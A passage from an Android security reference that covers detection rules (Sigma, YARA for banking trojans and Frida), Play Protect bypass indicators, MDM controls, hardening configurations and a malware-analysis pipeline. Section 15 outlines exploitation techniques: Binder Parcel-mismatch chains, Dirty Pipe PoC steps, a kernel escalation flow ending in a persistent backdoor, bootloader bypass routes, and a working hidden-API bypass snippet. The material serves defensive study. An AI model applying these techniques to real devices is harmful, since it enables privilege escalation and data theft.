# Detect Zygisk injection via /proc maps
adb shell su -c "cat /proc/$(pidof zygote)/maps | grep -i zygisk"
```

### 14.6 Sigma rules — suspicious broadcast receivers and dropper behavior

Dropper apps register broadcast receivers for `BOOT_COMPLETED`, `MY_PACKAGE_REPLACED`, and `CONNECTIVITY_CHANGE` to persist and trigger payload download after installation.

```yaml
title: Suspicious Broadcast Receiver Registration Pattern
id: 9a3f1d20-android-dropper-006
status: experimental
description: >
  Detects apps registering broadcast receivers for BOOT_COMPLETED combined with
  network connectivity triggers — a pattern consistent with dropper trojans that
  download second-stage payloads after installation and device restart.
logsource:
  product: android
  service: package_manager
detection:
  selection_boot:
    BroadcastAction: 'android.intent.action.BOOT_COMPLETED'
  selection_network:
    BroadcastAction|contains:
      - 'CONNECTIVITY_CHANGE'
      - 'CONNECTIVITY_ACTION'
  selection_self_update:
    BroadcastAction: 'android.intent.action.MY_PACKAGE_REPLACED'
  filter_known_system:
    CallerUid|lt: 10000
  condition: (selection_boot and selection_network) or (selection_boot and selection_self_update) and not filter_known_system
level: medium
tags:
  - attack.persistence
  - attack.t1398
```

### 14.7 YARA rules — banking trojan families

YARA rules for static detection of Android banking trojans. These target characteristic strings, class names, and structural patterns found in DEX bytecode and extracted APK assets.

```yara
rule Anatsa_BankingTrojan {
    meta:
        author      = "Android Threat Intel"
        description = "Detects Anatsa/Teabot banking trojan based on characteristic strings and class structure"
        date        = "2025-01-15"
        reference   = "https://www.threatfabric.com/blogs/anatsa-trojan-returns"
        severity    = "critical"

    strings:
        $pkg1       = "com.anatsalab" ascii
        $pkg2       = "com.okoov" ascii
        $cmd_overlay = "startOverlay" ascii
        $cmd_inject  = "injectActivity" ascii
        $cmd_sms     = "forwardSMS" ascii
        $cmd_screen  = "screenStream" ascii
        $c2_path     = "/api/v1/bot/" ascii
        $rc4_init    = { 8B 45 ?? 33 C9 89 4D ?? 89 45 ?? }
        $dex_header  = { 64 65 78 0A 30 33 }  // "dex\n03"
        $accessibility_class = "AccessibilityService" ascii

    condition:
        $dex_header and
        (2 of ($pkg*)) or
        (3 of ($cmd*) and $accessibility_class) or
        ($c2_path and $rc4_init)
}

rule Cerberus_Alien_Trojan {
    meta:
        author      = "Android Threat Intel"
        description = "Detects Cerberus/Alien banking trojan variants"
        date        = "2025-01-15"
        severity    = "critical"

    strings:
        $cerb_c2     = "/gate/" ascii
        $alien_panel  = "/api/mirrors" ascii
        $keylog       = "logKeys" ascii
        $screen_lock  = "lockDevice" ascii
        $vncreflect   = "startVNC" ascii
        $teamviewer   = "startTeamViewer" ascii
        $rat_cmd      = "execCommand" ascii
        $socks_proxy  = "startSocks5" ascii
        $botid_fmt    = "bot_id=" ascii
        $inject_html  = "inject_" ascii

    condition:
        (2 of ($cerb_c2, $alien_panel, $botid_fmt)) and
        (2 of ($keylog, $screen_lock, $vncreflect, $teamviewer, $rat_cmd, $socks_proxy)) or
        ($inject_html and $keylog and $screen_lock)
}

rule SharkBot_Trojan {
    meta:
        author      = "Android Threat Intel"
        description = "Detects SharkBot banking trojan, including dropper variants"
        date        = "2025-01-15"
        severity    = "critical"

    strings:
        $shark_c2    = "/shark/" ascii
        $ats_cmd     = "autoTransfer" ascii
        $push_inject = "pushInjection" ascii
        $cookie_grab = "grabCookies" ascii
        $dga_seed    = "generateDomain" ascii
        $uninstall   = "selfDelete" ascii
        $overlay_tgt = "targetPackage" ascii

    condition:
        ($shark_c2 and 2 of ($ats_cmd, $push_inject, $cookie_grab, $dga_seed)) or
        ($ats_cmd and $overlay_tgt and $uninstall)
}
```

### 14.8 YARA rules — Frida gadget and obfuscated DEX detection

```yara
rule Frida_Gadget_Library {
    meta:
        author      = "Android Security Ops"
        description = "Detects Frida gadget shared library injected into APKs for dynamic instrumentation"
        date        = "2025-01-15"
        severity    = "high"

    strings:
        $frida_agent = "frida-agent" ascii
        $frida_gadget = "frida-gadget" ascii
        $gum_interceptor = "gum_interceptor" ascii
        $gum_stalker = "gum_stalker" ascii
        $frida_rpc = "frida:rpc" ascii
        $elf_header = { 7F 45 4C 46 }  // ELF magic

    condition:
        $elf_header at 0 and
        (2 of ($frida_agent, $frida_gadget, $gum_interceptor, $gum_stalker, $frida_rpc))
}

rule Obfuscated_DEX_Suspicious {
    meta:
        author      = "Android Security Ops"
        description = "Detects heavily obfuscated DEX files with entropy anomalies and string encryption patterns"
        date        = "2025-01-15"
        severity    = "medium"

    strings:
        $dex_magic   = { 64 65 78 0A 30 33 }
        $string_decrypt = "decrypt" ascii
        $loader_reflect = "java/lang/reflect/Method" ascii
        $classloader = "dalvik/system/DexClassLoader" ascii
        $invoke      = "invoke" ascii
        // Common obfuscator artifacts
        $proguard_map = "proguard" ascii
        $allatori     = "allatori" ascii

    condition:
        $dex_magic at 0 and
        $classloader and $loader_reflect and $invoke and
        not $proguard_map  // Legitimate ProGuard leaves mapping files; heavy obfuscation removes them
}
```

### 14.9 Google Play Protect bypass indicators

Play Protect scans apps at install time and periodically on-device. Attackers bypass it through staged payload loading, version-based activation (benign behavior during initial scans, malicious behavior after update), and encrypted asset delivery.

**Detection signals for Play Protect bypass.**

| Indicator | Detection approach |
|-----------|-------------------|
| Delayed payload activation | App makes no network calls for 24-72h post-install, then contacts C2 |
| Dynamic code loading from assets | `DexClassLoader` instantiated with paths under `/data/data/<pkg>/files/` or encrypted `.dex` in assets folder |
| Versioned behavior switching | `BuildConfig.VERSION_CODE` or server-side flag gates malicious functionality |
| Encrypted APK assets | High-entropy files in `assets/` directory without standard media headers |
| Dropper chain | App A installs App B via `ACTION_INSTALL_PACKAGE` or session-based installer |

```bash
# Detect dynamic code loading artifacts
adb shell su -c "find /data/data/ -name '*.dex' -o -name '*.jar' -o -name '*.so' | grep -v '/oat/'"

# Check for high-entropy assets (potential encrypted payloads)
apktool d target.apk -o /tmp/apk_extracted
find /tmp/apk_extracted/assets -type f -exec sh -c 'echo "$(ent "$1" | head -1) $1"' _ {} \;
# Entropy > 7.9 bits/byte indicates encryption or compression

# List DexClassLoader usage in decompiled source
jadx -d /tmp/jadx_out target.apk
grep -rn "DexClassLoader\|InMemoryDexClassLoader\|PathClassLoader" /tmp/jadx_out/
```

### 14.10 MDM/UEM detection integration

Enterprise MDM (Mobile Device Management) and UEM (Unified Endpoint Management) platforms ingest Android device telemetry and can enforce compliance policies that act as detection controls.

**Key MDM/UEM detection signals.**

| Signal | MDM/UEM action |
|--------|----------------|
| Device rooted / bootloader unlocked | Block corporate resource access, wipe work profile |
| Play Integrity verdict < MEETS_DEVICE_INTEGRITY | Quarantine device, require remediation |
| Unknown sources enabled | Flag non-compliance, block managed app installation |
| Accessibility service outside allowlist | Alert SOC, trigger device check-in |
| USB debugging enabled in production | Compliance violation alert |
| Developer options enabled | Informational alert, risk score increase |
| Device encryption disabled | Block enrollment, require encryption |
| OS version below minimum patch level | Quarantine until updated |

**Integration with SIEM.** MDM/UEM platforms (Microsoft Intune, VMware Workspace ONE, Ivanti, SOTI) export device compliance events via syslog, API, or native SIEM connectors. Map MDM events to the Sigma rules above to correlate device-level indicators with network-level detections. For example, an accessibility-service-enabled event from MDM correlating with an overlay-window-creation event from the app sandbox strengthens the confidence of a banking trojan detection.

---

## 15. Advanced Android Exploitation

This section covers exploitation techniques beyond standard app-layer vulnerabilities — targeting the Binder IPC mechanism, the Linux kernel as exposed on Android, the TrustZone TEE, and the ART runtime.

### 15.1 Binder IPC exploitation

Binder is Android's primary IPC mechanism. Every cross-process call — from app to system service, between apps via AIDL, and from framework to native daemons — transits the Binder driver (`/dev/binder`, `/dev/hwbinder`, `/dev/vndbinder`). The driver marshals `Parcel` objects containing serialized data across process boundaries.

**Transaction deserialization attacks.** Binder `Parcel` objects contain typed data: primitives, strings, `Parcelable` objects, file descriptors, and `IBinder` references. The sender writes data into the `Parcel`; the receiver reads it back. If the receiver reads a different type or length than the sender wrote, a **Parcel mismatch** occurs. This desynchronizes the read cursor, causing subsequent reads to consume wrong data — potentially interpreting attacker-controlled bytes as `IBinder` references, `FileDescriptor` objects, or intent fields.

**CVE-2021-0928 (Parcel mismatch in `OutputConfiguration`).** The `OutputConfiguration` `Parcelable` class had inconsistent `writeToParcel()` and `createFromParcel()` implementations. When serialized to disk and deserialized in a different context (the `LazyValue` re-serialization path in `system_server`), the mismatch allowed an attacker to craft a `Parcel` that, when re-deserialized, produced a malicious `Intent` object. This `Intent` could launch arbitrary activities with `system_server` privileges, achieving local privilege escalation to `system` (UID 1000).

**Attack pattern.**

1. Craft a `Parcelable` with mismatched write/read logic.
2. Send it to `system_server` via an IPC call that stores it in a `Bundle`.
3. `system_server` re-serializes the `Bundle` (the `LazyValue` path writes and re-reads the `Parcelable`).
4. On re-deserialization, the cursor offset mismatch causes a controlled type confusion.
5. The confused data is interpreted as an `Intent`, which `system_server` delivers with its own privileges.

**CVE-2022-20452 (Parcel mismatch in `LazyValue`).** Another variant of the same class of vulnerability. The `LazyValue` mechanism in `BaseBundle` delays deserialization of `Parcelable` objects until they are accessed. If the `Parcelable`'s serialized size differs between the initial write and the lazy read, the cursor offset shifts. This was exploited to achieve arbitrary `Intent` delivery from `system_server`, enabling installation of arbitrary apps, granting of arbitrary permissions, or launching of activities with system-level flags.

```java
// Conceptual structure of a Parcel mismatch attack
// The key insight: writeToParcel writes N bytes, createFromParcel reads M bytes (N != M)
// When system_server re-serializes, the offset difference corrupts subsequent fields

// Vulnerable pattern in a Parcelable:
public void writeToParcel(Parcel dest, int flags) {
    dest.writeInt(this.type);
    if (this.type == TYPE_SPECIAL) {
        dest.writeString(this.data);      // Writes string (variable length)
    }
}

public static MyParcelable createFromParcel(Parcel in) {
    int type = in.readInt();
    // BUG: always reads the string regardless of type
    String data = in.readString();         // Reads even when type != TYPE_SPECIAL
    return new MyParcelable(type, data);
}
// Attacker sets type != TYPE_SPECIAL, so writeToParcel skips the string,
// but createFromParcel reads it anyway — consuming bytes from the NEXT field
```

**Detection.** Monitor `system_server` crash logs for `BadParcelableException`, `ClassNotFoundException` during `Parcel` deserialization, and `TransactionTooLargeException` with unusual stack traces. Repeated Binder transaction failures targeting specific system services may indicate exploitation attempts.

### 15.2 Kernel exploitation on Android

Android's Linux kernel inherits the full kernel attack surface, plus Android-specific drivers (Binder, ION/dma-buf, GPU vendor drivers, camera HALs, codec drivers). Kernel vulnerabilities provide the path from app sandbox to root.

**CVE-2022-0847 (Dirty Pipe) on Android.** Dirty Pipe exploited a flaw in the Linux pipe buffer management: the `PIPE_BUF_FLAG_CAN_MERGE` flag was not cleared when a new pipe buffer page was allocated, allowing a `splice()` followed by a `write()` to overwrite the contents of a read-only page-cache page. On Android, this allowed any app to overwrite files owned by root (including `/system` partition files cached in the page cache), achieving privilege escalation without any kernel code execution.

```bash
# Check if an Android device is vulnerable to Dirty Pipe
adb shell uname -r
# Vulnerable: Linux kernels 5.8 through 5.16.10 (patched in 5.16.11, 5.15.25, 5.10.102)
# Pixel 6 (shipped with 5.10.43) was initially vulnerable; patched in March 2022 security update

# PoC concept (do NOT run on production devices):
# 1. Open a target file read-only (e.g., /etc/passwd via /system/etc/passwd)
# 2. Create a pipe, fill it, drain it (leave PIPE_BUF_FLAG_CAN_MERGE set)
# 3. splice() the target file into the pipe (shares page cache page with pipe)
# 4. write() to the pipe — overwrites the page cache page
# 5. The target file now contains attacker-controlled content
```

**Samsung and Qualcomm driver vulnerabilities.** Vendor-specific kernel drivers are a rich attack surface because they often lack the security scrutiny of mainline kernel code:

| CVE | Vendor | Component | Impact |
|-----|--------|-----------|--------|
| CVE-2022-22706 | ARM | Mali GPU driver | Memory corruption in GPU driver allowing kernel code execution. Exploited in the wild (2022). |
| CVE-2023-4211 | ARM | Mali GPU driver (CSF) | Use-after-free in GPU memory management. Exploited in the wild. |
| CVE-2023-21492 | Samsung | Kernel ASLR bypass | Kernel pointer leak via UART debug log exposure in Samsung devices, used as part of an exploit chain by a commercial spyware vendor. |
| CVE-2023-33106 | Qualcomm | Adreno GPU driver | Memory corruption in Adreno GPU driver. Exploited in the wild as part of a targeted attack chain. |
| CVE-2024-0044 | Android | `run-as` command | Logic error in `run-as` allowed any app to execute commands as any other app's UID. Enabled full sandbox escape on Android 12-14. |

**Exploitation flow for Android kernel bugs.** A typical privilege-escalation chain:

1. **Info leak** — obtain kernel base address (bypass kASLR). Techniques: `/proc/kallsyms` (if accessible), kernel pointer leaks in vendor drivers, side-channel attacks.
2. **Corruption primitive** — achieve a write-what-where or use-after-free. Target: kernel heap objects (e.g., `struct cred`, `struct file`, pipe buffers, Binder transaction buffers).
3. **Privilege escalation** — overwrite the current process's `cred` structure to set UID=0, or overwrite SELinux enforcement state, or modify `addr_limit` (pre-5.10 kernels) to gain arbitrary kernel read/write.
4. **Post-exploitation** — disable SELinux (`setenforce 0` via kernel write), remount `/system` read-write, install persistent backdoor.

### 15.3 TEE (TrustZone) attack surface

ARM TrustZone divides the processor into a Normal World (Android, Linux kernel) and a Secure World (trusted OS running Trusted Applications — TAs). On Android, the Secure World hosts Keymaster/KeyMint (hardware-backed keystore), Gatekeeper (lockscreen credential verification), biometric matching, DRM (Widevine L1), and Play Integrity attestation.

**TA exploitation.** Trusted Applications are loaded and executed by the trusted OS (Qualcomm QSEE, Samsung TEEGRIS, Trustonic Kinibi, Google Trusty). Vulnerabilities in TAs can be exploited from the Normal World via the SMC (Secure Monitor Call) interface:

- **Buffer overflows in TA command handlers.** The Normal World sends commands to TAs via a shared-memory buffer. If the TA does not validate buffer sizes, an attacker can overflow a heap or stack buffer in the Secure World.
- **Type confusion in serialization.** TAs that deserialize complex structures from Normal World input are vulnerable to type confusion (analogous to Binder Parcel mismatches, but in the Secure World).
- **Cryptographic key extraction.** A compromised TA can read the hardware-fused keys (e.g., device-unique hardware key, attestation keys). This breaks hardware-backed Keystore security and enables forging Play Integrity attestation responses.

**Real-world TEE attacks.**

| Attack | Year | Target | Impact |
|--------|------|--------|--------|
| Qualcomm QSEE exploit chain (Project Zero) | 2019 | QSEE trusted OS | Full Secure World code execution. Extracted hardware-fused keys from Pixel 1-2 devices. |
| Samsung TEEGRIS Keymaster exploit | 2022 | S10/S20/S21 Keymaster TA | Extracted hardware-wrapped encryption keys due to IV reuse in AES-GCM wrapping. Published by Tel Aviv University researchers. |
| Trustonic Kinibi vulnerabilities | 2020 | Multiple OEMs using Kinibi | Stack buffer overflows in TA loading allowed code execution in Secure World. |

**Secure World escape.** If an attacker achieves code execution in a TA, the next step is escaping the TA sandbox to compromise the trusted OS itself. This requires exploiting the trusted OS kernel — a second vulnerability. Once the trusted OS is compromised, the attacker controls all Secure World services: Keymaster, Gatekeeper, biometric verification, DRM.

### 15.4 ART runtime exploitation

The Android Runtime (ART) compiles DEX bytecode to native code ahead-of-time (AOT) or just-in-time (JIT). Exploitation of ART targets the managed code execution environment itself.

**JIT spraying.** ART's JIT compiler generates native code from DEX bytecode at runtime. An attacker who can influence the bytecode patterns (e.g., via a malicious app or by corrupting the DEX file loaded by a target app) can cause the JIT to emit native code gadgets at predictable locations. Combined with a memory corruption vulnerability, these gadgets serve as a JIT spray payload. Android's CFI and PAC (Pointer Authentication on ARMv8.3+) mitigations make this significantly harder on modern devices.

**Managed code attacks.** Even without native code execution, the ART runtime enables powerful attacks through reflection and dynamic class loading:

- **Reflection-based privilege escalation.** Hidden APIs in the Android framework (annotated `@hide`) can be called via reflection. Android 9+ introduced hidden API restrictions (`@UnsupportedAppUsage`), but these are bypassable via double-reflection (reflecting on `Method.invoke` to call hidden `Method` objects) or by using `unseal` techniques that modify the hidden API enforcement policy at runtime.
- **Dynamic DEX loading.** `DexClassLoader` and `InMemoryDexClassLoader` allow loading arbitrary DEX files at runtime. Malware uses this to load encrypted payloads that are not present in the original APK (evading Play Protect static analysis).

```java
// Double-reflection to bypass hidden API restrictions (Android 9-12)
// This technique accesses @hide methods by reflecting on the reflection API itself
Method getDeclaredMethod = Class.class.getDeclaredMethod(
    "getDeclaredMethod", String.class, Class[].class);
Method setHiddenApiExemptions = getDeclaredMethod.invoke(
    VMRuntime.class, "setHiddenApiExemptions", new Class[]{String[].class});
setHiddenApiExemptions.invoke(
    VMRuntime.getRuntime(), new Object[]{new String[]{"L"}});
// Now all hidden APIs are accessible via normal reflection
```

### 15.5 Bootloader unlocking and secure boot bypass

The bootloader is the first code that runs after the hardware initializes. On most Android devices, the bootloader is locked by default and verifies the boot chain (§4.2). Unlocking the bootloader disables Verified Boot verification, sets the boot state to `ORANGE`, and typically wipes user data.

**OEM-specific unlock mechanisms.**

| OEM | Unlock method | Notes |
|-----|--------------|-------|
| Google Pixel | `fastboot flashing unlock` | Always supported. Wipes data. |
| Samsung | OEM unlock toggle + `fastboot flashing unlock` | Triggers Knox warranty void (e-fuse blown). Knox-secured apps permanently disabled. |
| Xiaomi | Mi Unlock tool (requires Xiaomi account, wait period) | 72h-168h server-side wait. Anti-reseller measure. |
| OnePlus | `fastboot oem unlock` | Straightforward. Wipes data. |
| Huawei | No longer provides unlock codes (since 2018) | Third-party code generators exist but are untrustworthy. |

**Secure boot bypass techniques.** When the bootloader cannot be unlocked through legitimate means, attackers pursue:

- **EDL (Emergency Download Mode) exploits.** Qualcomm EDL mode (`9008` mode) allows low-level flash access. Leaked Qualcomm firehose programmers (`.mbn` files) enable reading/writing raw flash partitions, bypassing the bootloader entirely. Device-specific firehose programmers are not signed on older chipsets.
- **Bootloader vulnerabilities.** Buffer overflows or command injection in the `fastboot` implementation allow arbitrary code execution at bootloader privilege. CVE-2017-5626 (Motorola bootloader command injection) and CVE-2018-10233 (LG bootloader) are historical examples.
- **Downgrade attacks.** Flashing an older firmware version with known vulnerabilities. Android's rollback protection (anti-rollback counters stored in hardware-backed RPMB) prevents this on devices with proper implementation — but some OEMs implement anti-rollback incorrectly or not at all.

---

## 16. Android Hardening Reference

### 16.1 Enterprise device hardening — Android Enterprise work profile

Android Enterprise provides a managed device framework with separation between personal and work data. The work profile runs as a separate Android user (managed by a Device Policy Controller app) with its own app sandbox, keystore, and network configuration.

**Work profile security configuration.**

```xml
<!-- Device policy configuration for work profile -->
<!-- Enforced by the DPC (Device Policy Controller) app -->

<!-- Minimum password quality -->
<password-quality>alphanumeric</password-quality>
<min-password-length>8</min-password-length>

<!-- Disable features in work profile -->
<disable-camera />
<disable-screen-capture />
<disable-usb-file-transfer />

<!-- Require encryption -->
<encrypted-storage>required</encrypted-storage>

<!-- Network restrictions -->
<always-on-vpn>
  <package>com.enterprise.vpn</package>
  <lockdown>true</lockdown>
</always-on-vpn>
```

```bash
# Query work profile status
adb shell pm list users
# UserInfo{0:Owner:c13} flags=c13  → primary user
# UserInfo{10:Work profile:1030} flags=1030  → managed work profile

# List apps in work profile
adb shell pm list packages --user 10

# Check device policy restrictions
adb shell dumpsys device_policy

# Check if work profile is encrypted
adb shell dumpsys mount | grep -A5 "user 10"
```

**Recommended Android Enterprise policies for high-security deployments.**

| Policy | Setting | Rationale |
|--------|---------|-----------|
| Minimum OS version | Android 13+ | API-level security improvements, per-app language, photo picker |
| Security patch level | Within 90 days | Ensures kernel and framework patches are current |
| Play Integrity | MEETS_DEVICE_INTEGRITY minimum | Rejects rooted/tampered devices |
| Unknown sources | Blocked in work profile | Prevents sideloading in managed context |
| USB debugging | Disabled | Prevents ADB-based data extraction |
| Developer options | Disabled | Removes attack surface |
| Screen capture | Disabled in work profile | Prevents screenshot-based data exfiltration |
| VPN | Always-on with lockdown | Forces all work traffic through corporate VPN |
| Bluetooth | Restricted in work profile | Limits data transfer channels |
| Camera | Per-policy | Disable in sensitive environments |

### 16.2 Developer-facing hardening — ProGuard/R8 configuration

R8 (the default code shrinker/obfuscator since Android Gradle Plugin 3.4) replaces ProGuard. Proper configuration removes unused code, obfuscates class/method/field names, and optimizes bytecode.

```proguard
# r8-rules.pro — security-focused R8 configuration

# Enable aggressive obfuscation
-optimizationpasses 5
-allowaccessmodification
-repackageclasses ''

# Remove logging in release builds
-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
}

# Obfuscate but preserve entry points
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.app.Application

# Preserve security-critical classes from reflection-based bypass
-keep class androidx.security.crypto.** { *; }
-keep class com.google.android.gms.safetynet.** { *; }
-keep class com.google.android.play.core.integrity.** { *; }

# Preserve Parcelable implementations (prevent Parcel mismatch issues)
-keep class * implements android.os.Parcelable {
    public static final ** CREATOR;
    public void writeToParcel(android.os.Parcel, int);
}

# Remove debug metadata
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable  # Keep for crash reporting
```

### 16.3 Network security config best practices

The network security configuration file (`res/xml/network_security_config.xml`) controls TLS behavior, certificate pinning, and cleartext traffic policies (extends §11).

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <!-- Block all cleartext (HTTP) traffic by default -->
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <!-- Trust only system CAs (not user-installed CAs) -->
            <certificates src="system" />
        </trust-anchors>
    </base-config>

    <!-- Certificate pinning for backend API -->
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-01-01">
            <!-- Pin the intermediate CA (NOT the leaf certificate) -->
            <!-- Use SPKI hash (SHA-256 of SubjectPublicKeyInfo) -->
            <pin digest="SHA-256">YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=</pin>
            <!-- Backup pin (different CA) -->
            <pin digest="SHA-256">Vjs8r4z+80wjNcr1YKepWQboSIRi63WsWXhIMN+eWys=</pin>
        </pin-set>
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </domain-config>

    <!-- Allow cleartext only for specific local development domain -->
    <!-- REMOVE in production builds -->
    <!--
    <domain-config cleartextTrafficPermitted="true">
        <domain>10.0.2.2</domain>
    </domain-config>
    -->
</network-security-config>
```

```bash
# Verify network security config is applied
adb shell run-as com.example.app cat res/xml/network_security_config.xml

# Test cleartext blocking
adb shell am start -a android.intent.action.VIEW -d "http://example.com"
# Should fail if cleartextTrafficPermitted="false"

# Extract and inspect pinned certificates
apktool d target.apk -o /tmp/apk_out
cat /tmp/apk_out/res/xml/network_security_config.xml
```

### 16.4 Certificate pinning implementation

Beyond the declarative XML config, apps can implement programmatic certificate pinning for additional control.

```kotlin
// OkHttp certificate pinner (Kotlin)
val certificatePinner = CertificatePinner.Builder()
    .add("api.example.com",
        "sha256/YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=",  // Primary
        "sha256/Vjs8r4z+80wjNcr1YKepWQboSIRi63WsWXhIMN+eWys="   // Backup
    )
    .build()

val client = OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build()
```

### 16.5 Biometric authentication implementation

Proper biometric integration ties cryptographic operations to biometric verification, ensuring that a successful authentication is not just a UI gate but a hardware-enforced key unlock.

```kotlin
// Crypto-bound biometric authentication (Kotlin)
// Key is unusable without successful biometric verification

// 1. Generate a biometric-bound key
val keyGenSpec = KeyGenParameterSpec.Builder(
    "biometric_key",
    KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setUserAuthenticationRequired(true)
    .setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG)
    .setInvalidatedByBiometricEnrollment(true)
    .build()

val keyGenerator = KeyGenerator.getInstance(
    KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore"
)
keyGenerator.init(keyGenSpec)
keyGenerator.generateKey()

// 2. Use with BiometricPrompt
val keyStore = KeyStore.getInstance("AndroidKeyStore")
keyStore.load(null)
val key = keyStore.getKey("biometric_key", null) as SecretKey
val cipher = Cipher.getInstance("AES/GCM/NoPadding")
cipher.init(Cipher.ENCRYPT_MODE, key)

val cryptoObject = BiometricPrompt.CryptoObject(cipher)
biometricPrompt.authenticate(promptInfo, cryptoObject)
// The cipher is only usable after successful biometric authentication
// Attempting cipher.doFinal() before authentication throws UserNotAuthenticatedException
```

### 16.6 Encrypted SharedPreferences

```kotlin
// Jetpack Security EncryptedSharedPreferences
// Uses AES-256-GCM for values, AES-256-SIV for keys
val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .setUserAuthenticationRequired(true)
    .setUserAuthenticationParameters(300, KeyProperties.AUTH_BIOMETRIC_STRONG)
    .build()

val sharedPreferences = EncryptedSharedPreferences.create(
    context,
    "secure_prefs",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)

// Usage is identical to standard SharedPreferences
sharedPreferences.edit()
    .putString("auth_token", token)
    .apply()
```

### 16.7 SELinux policy customization

On AOSP or custom ROM builds, SELinux policies can be extended to further restrict app behavior.

```bash
# Inspect current SELinux context of an app
adb shell ps -Z | grep com.example.app
# u:r:untrusted_app:s0:c512,c768  com.example.app

# List SELinux denials (requires root)
adb shell su -c "dmesg | grep 'avc:  denied'"

# Check SELinux mode
adb shell getenforce
# Enforcing

# Audit2allow: generate policy rules from denial logs
# (Used during AOSP/custom ROM development, NOT on production devices)
adb shell su -c "dmesg | grep 'avc:  denied'" | audit2allow -p /sys/fs/selinux/policy

# Example custom policy module (app_custom.te):
# Deny untrusted_app access to /proc/kallsyms
# neverallow untrusted_app proc_kallsyms:file { read open };
```

### 16.8 OWASP MASVS/MASTG compliance checklist

The OWASP Mobile Application Security Verification Standard (MASVS) defines three verification levels. The Mobile Application Security Testing Guide (MASTG) provides test procedures for each requirement.

| MASVS Category | Key Requirements | MASTG Test IDs | Chapter Reference |
|----------------|-----------------|----------------|-------------------|
| MASVS-STORAGE | No sensitive data in logs, backups, clipboard. Encrypted local storage. | MSTG-STORAGE-1 through MSTG-STORAGE-12 | §10, §12, §17 |
| MASVS-CRYPTO | No hardcoded keys, no weak algorithms, proper key management via Keystore. | MSTG-CRYPTO-1 through MSTG-CRYPTO-6 | §10 |
| MASVS-AUTH | Biometric + server-side verification, session management. | MSTG-AUTH-1 through MSTG-AUTH-12 | §16.5 |
| MASVS-NETWORK | TLS everywhere, certificate pinning, no cleartext. | MSTG-NETWORK-1 through MSTG-NETWORK-6 | §9, §11, §16.3 |
| MASVS-PLATFORM | Intent validation, WebView hardening, permission minimization. | MSTG-PLATFORM-1 through MSTG-PLATFORM-10 | §2, §3 |
| MASVS-CODE | Code obfuscation, root detection, debugger detection, integrity checks. | MSTG-CODE-1 through MSTG-CODE-9 | §6, §8, §16.2 |
| MASVS-RESILIENCE | Anti-tampering, emulator detection, hooking framework detection. | MSTG-RESILIENCE-1 through MSTG-RESILIENCE-13 | §5, §6, §14 |

---

## 17. Android Malware Analysis and Forensics Deep Dive

This section provides a practitioner's pipeline for analyzing Android malware, from static APK analysis through dynamic instrumentation to forensic artifact extraction. It complements §12 (Android forensics — acquisition methods and general data extraction) by focusing on malware-specific analysis workflows.

### 17.1 Static analysis pipeline

**Step 1 — APK extraction and decoding.**

```bash
# Pull the APK from the device
adb shell pm path com.suspect.app
# package:/data/app/~~abc123/com.suspect.app-xyz/base.apk
adb pull /data/app/~~abc123/com.suspect.app-xyz/base.apk suspect.apk

# For split APKs (common on Android 10+)
adb shell pm path com.suspect.app
# May return multiple paths (base.apk + split_config.*.apk)
# Pull all of them

# Decode the APK with apktool (extracts manifest, resources, smali)
apktool d suspect.apk -o /tmp/suspect_decoded
# Output: /tmp/suspect_decoded/
#   AndroidManifest.xml   (decoded, human-readable)
#   smali/                (Dalvik bytecode disassembly)
#   res/                  (decoded resources)
#   assets/               (raw assets)
#   lib/                  (native libraries)

# Decompile to Java with jadx
jadx -d /tmp/suspect_jadx suspect.apk
# Output: /tmp/suspect_jadx/
#   sources/              (decompiled Java source)
#   resources/            (decoded resources)
```

**Step 2 — Manifest analysis.**

```bash
# Extract key security-relevant manifest attributes
grep -E "permission|service|receiver|provider|activity" /tmp/suspect_decoded/AndroidManifest.xml

# Check for dangerous permissions
grep -E "RECEIVE_SMS|READ_SMS|SEND_SMS|READ_CONTACTS|RECORD_AUDIO|CAMERA|ACCESS_FINE_LOCATION|BIND_ACCESSIBILITY_SERVICE|SYSTEM_ALERT_WINDOW|BIND_DEVICE_ADMIN|REQUEST_INSTALL_PACKAGES|READ_PHONE_STATE|CALL_PHONE|WRITE_EXTERNAL_STORAGE" \
    /tmp/suspect_decoded/AndroidManifest.xml

# Check for backup allowance (data exfiltration via adb backup)
grep "allowBackup" /tmp/suspect_decoded/AndroidManifest.xml

# Check for debuggable flag
grep "debuggable" /tmp/suspect_decoded/AndroidManifest.xml

# Check for network security config reference
grep "networkSecurityConfig" /tmp/suspect_decoded/AndroidManifest.xml
```

**Step 3 — Automated scanning with androguard.**

```python
#!/usr/bin/env python3
"""Automated APK security analysis using androguard."""
from androguard.misc import AnalyzeAPK

apk, dalvik_vm, analysis = AnalyzeAPK("suspect.apk")

# Basic info
print(f"Package:     {apk.get_package()}")
print(f"Main Activity: {apk.get_main_activity()}")
print(f"Target SDK:  {apk.get_target_sdk_version()}")
print(f"Min SDK:     {apk.get_min_sdk_version()}")

# Permissions
print("\n--- Permissions ---")
for perm in sorted(apk.get_permissions()):
    print(f"  {perm}")

# Receivers with intent filters
print("\n--- Broadcast Receivers ---")
for receiver in apk.get_receivers():
    print(f"  {receiver}")
    for intent_filter in apk.get_intent_filters("receiver", receiver):
        print(f"    Filter: {intent_filter}")

# Services (look for accessibility services)
print("\n--- Services ---")
